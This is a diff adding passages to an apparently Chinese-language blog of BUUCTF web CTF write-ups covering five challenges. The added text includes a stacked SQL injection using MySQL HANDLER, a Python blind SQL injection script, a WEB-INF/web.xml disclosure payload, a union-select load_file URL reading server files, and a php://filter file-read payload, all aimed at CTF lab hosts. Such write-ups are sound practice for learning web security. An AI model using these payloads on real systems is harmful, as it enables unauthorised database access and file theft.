@@ -169,6 +169,10 @@ get传参cat&amp;#x3D;do">
             
             
             
+                <span class="category">
+                    <a href="/categories/web/">web</a>
+                </span>
+            
         </div>
     </div>
 
@@ -547,11 +551,83 @@ get传参cat&amp;#x3D;do">
 <p>随便输入密码，将其MD5加密后传入第三个字段。</p>
 <p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/123.png"></p>
 <p>202cb962ac59075b964b07152d234b70是123的md5加密后结果</p>
+<h4 id="31-GYCTF2020-Blacklist"><a href="#31-GYCTF2020-Blacklist" class="headerlink" title="31.[GYCTF2020]Blacklist"></a>31.[GYCTF2020]Blacklist</h4><p>和强网杯随便注类似，但是多加了限制条件</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/104.png"></p>
+<p>过滤了这么多，select用不了，只能用堆叠注入了。rename,alter被禁，换表名也不行了。</p>
+<p>这题看了大佬们的wp，学到了新语法。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaonuoqi/p/12398554.html">https://www.cnblogs.com/gaonuoqi/p/12398554.html</a></p>
+<p><code>HANDLER ... OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句访问，该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line">HANDLER FlagHere OPEN;</span><br><span class="line">HANDLER FlagHere READ FIRST;</span><br><span class="line">HANDLER FlagHere CLOSE;#</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="32-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#32-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="32.[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>32.[CISCN2019 华北赛区 Day2 Web1]Hack World</h4><p>进去后输入1,2都有回显，3，4往后都回显用户不存在</p>
+<p>当我们输入字母是，报错bool(false)，类型错误，当输入1’是还是报错，1&#x2F;1时有回显。说明是数字型注入。</p>
+<p>bp抓包用fuzz字典测过滤，发现几乎函数都被过滤了。那试试盲注。</p>
+<p>这里贴上大佬脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def blind_injection(url):</span><br><span class="line">	flag = &#x27;&#x27;</span><br><span class="line">	strings = string.printable</span><br><span class="line">	for num in range(1,60):</span><br><span class="line">		for i in strings:</span><br><span class="line">			payload = &#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;.format(num,ord(i))</span><br><span class="line">			post_data = &#123;&quot;id&quot;:payload&#125;</span><br><span class="line">			res = requests.post(url=url,data=post_data)</span><br><span class="line">			if &#x27;Hello&#x27; in res.text:</span><br><span class="line">				flag += i</span><br><span class="line">				print(flag)</span><br><span class="line">			else:</span><br><span class="line">				continue</span><br><span class="line">	print(flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	url = &#x27;http://64368c9f-dd87-4c49-b9a1-d4b82e98c87a.node3.buuoj.cn/index.php&#x27;</span><br><span class="line">	blind_injection(url)</span><br></pre></td></tr></table></figure>
+
+<p>最终跑出flag。个人认为这题关键是根据回显推出用什么手段注入。数字型注入比较少，一般都是字符型注入。</p>
+<h4 id="33-RoarCTF-2019-Easy-Java"><a href="#33-RoarCTF-2019-Easy-Java" class="headerlink" title="33.[RoarCTF 2019]Easy Java"></a>33.[RoarCTF 2019]Easy Java</h4><p>这题学到了新知识：WEB-INF&#x2F;web.xml泄露</p>
+<p>进去后是一个登录界面。试了一会觉得没有考sql注入。</p>
+<p>点击help，进去后发现url变了。但是get传参访问不到，这题要post传参</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/105.png"></p>
+<p>下载的文档打开后提示flag不在这里。看了大佬们的wp，这题考的WEB-INF&#x2F;web.xml泄露</p>
+<p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p>
+<p>​         </p>
+<pre><code>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
+</code></pre>
+<p>​         </p>
+<pre><code>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
+</code></pre>
+<p>​         </p>
+<pre><code>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
+</code></pre>
+<p>​         </p>
+<pre><code>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
+</code></pre>
+<p>​         </p>
+<pre><code>/WEB-INF/database.properties：数据库配置文件
+</code></pre>
+<p>漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^&#x2F;WEB-INF&#x2F;* { deny all; } 或者return 404; 或者其他！</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/78165051">https://blog.csdn.net/wy_97/article/details/78165051</a></p>
+<p>payload:filename&#x3D;WEB-INF&#x2F;web.xml</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/106.png"></p>
+<p>看到flag路径。是class文件路径，最后要加上class文件后缀</p>
+<p>最终payload：filename&#x3D;WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;FlagController.class</p>
+<p>下载后base64即可。</p>
+<h4 id="34-网鼎杯-2018-Fakebook"><a href="#34-网鼎杯-2018-Fakebook" class="headerlink" title="34.[网鼎杯 2018]Fakebook"></a>34.[网鼎杯 2018]Fakebook</h4><p>login 不成功，试试join，博客格式随便尝试，最终后缀为.blog</p>
+<p>进入后发现url多了?no&#x3D;1  随后发现存在sql注入</p>
+<p>过滤了union select中间的空格，用&#x2F;**&#x2F;过滤，发现有4列</p>
+<p>报错注入发现回显在2的位置</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/107.png"></p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/108.png"></p>
+<p>看到了字段</p>
+<p>这里报错中提示&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php其实可以猜到flag的路径，我们用load_file函数来读取</p>
+<p>最终payload:</p>
+<p><a target="_blank" rel="noopener" href="http://2299d48b-7c01-41b6-a893-6273f2790efa.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,load_file(%22/var/www/html/flag.php%22),3,4%20#">http://2299d48b-7c01-41b6-a893-6273f2790efa.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,load_file(%22/var/www/html/flag.php%22),3,4%20#</a></p>
+<h4 id="35-BSidesCF-2020-Had-a-bad-day"><a href="#35-BSidesCF-2020-Had-a-bad-day" class="headerlink" title="35.[BSidesCF 2020]Had a bad day"></a>35.[BSidesCF 2020]Had a bad day</h4><p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/109.png"></p>
+<p>观察url猜测有sql注入。</p>
+<p>利用php伪协议读取下index.php</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/110.png"></p>
+<p>无法打开流。尝试改为index后成功了。</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/111.png"></p>
+<p>要有woofers,meowers,index三个之一才能触发include函数</p>
+<p>最终payload:?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;index&#x2F;resource&#x3D;flag</p>
 
     </div>
 
     
 
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/web/">#web</a>
+        </div>
     
 
     <!-- Comments -->
@@ -593,6 +669,17 @@ get传参cat&amp;#x3D;do">
 
 
             
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/web/">web</a>
+        </li>
+        
+    </ul>
+</div>
+
         </div>
         <div class="row">
             <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
